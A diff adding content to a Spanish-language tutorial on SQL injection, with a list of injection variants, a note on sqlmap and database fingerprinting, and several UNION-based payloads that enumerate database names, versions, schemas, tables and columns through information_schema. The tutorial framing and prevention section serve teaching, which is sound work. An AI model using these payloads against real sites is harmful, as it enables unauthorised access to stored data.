@@ -147,7 +147,20 @@ Con dice el nombre, `inyectamos código SQL en un input` o campo que tenga acces
 
 `Ejemplo`: hay una página de login donde hay dos campos, user y password (sin tener en cuenta las cookies, la url... que también pueden servir). Claro, nosotros podemos meter esos datos y compará si ese user coincide con esa contraseña, pero si la web `no sanitiza el input` del usuario, permite que se pueda "engañar" a la web y que `en vez de mandarle un user, que le mande nuestra consula SQL`, así la BBDD `interpretará nuestra consulta y nos devolverá lo que nosotros queramos`, por ejemplo; el nombre de la base de datos, de las tablas... (pudiendo ver usuarios, contraseñas, correos electronicos...).
 
+Hay distintas formas (pero eso lo explicaré en el siguiente artículo):
+
+```
+  - SQLi
+  - SQLi Blind
+  - SQLi Mediante el tiempo de la respuesta
+  - No SQLi (este lo explico despues)
+  - SQLi mediante peticiones
+  - ...
+```
+
 ## COMO EFECTUAR ESTE ATAQUE
+
+(`NOTA:` antes de realizar este ataque es recomendable saber que tipo de BBDD tiene, pero sino se puede probar un poco a fuerza bruta, ya que no es lo mismo MySQL, que SQLserver, que SQL... (si no se especifica `sqlmap` prueba todas a fuerza bruta, pero si se especifica se pueden lograr mejores resultados en menos tiempo)
 
 Para explicar un poco por encima `como funcionan las consultas SQL`, poruqe `lo mas importante` que tenemos que saber es `como funcionan las BBDD`  y `como funcionan las cunsultas SQL`. Y ver como utilizarlas para realizar este ataque voy a poner un ejemplo muy básico (`nota:` los ataques que se hacen en un entorno real son mas complicados, pero eso lo explicaré en otro artículo, porque sino este sera demasiado largo)
 
@@ -203,6 +216,52 @@ SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
 ```
 
 La consulta modificada devolverá todos los artículos en los que la categoría sea Regalos o 1 sea igual a 1. Como siempre es verdadero, la consulta devolverá todos los elementos. `1=1`
+
+.............................................................................................................................................................
+
+.............................................................................................................................................................
+
+Claro, ese es un ataque muy simple, pero se pueden hacer cosas mas complejas como listar la BBDD, es decir, ver que BBDD hay y su nombre, las tablas que tiene, las columnas...
+
+Por ejemplo:
+
+Para listar la BBDD:
+
+```
+' union select database()-- -
+```
+
+En caso de que huviese mas columnas, por ejemplo 4 y la cuarta fuese la que interpreta:
+
+```
+' union select 1,2,3,database()-- - 
+```
+
+Para ver la version de la BBDD:
+
+```
+' union select version()-- -
+```
+
+Para listar otras BBDD-s existentes:
+
+```
+' union select schema_name from information_schema.schemata-- -
+```
+
+Ver las tablas de otra base de datos que hemos encontrado:
+
+```
+' union select table_name from information_schema.tables where table_schema="{nombre de la BBDD}"-- -
+```
+
+Ver las columnas de una tabla de esa otra BBDD:
+
+```
+' union select column_name from information_schema.columns where table_schema="{nombre de la BBDD}" and table_name="{nombre de la tabla}"-- -
+```
+
+(`NOTA:` lo explicaré bien en el siguiente artículo, y también explicaré `sqlmap` en ese artículo)
 
 ## PREVENCIÓN
 
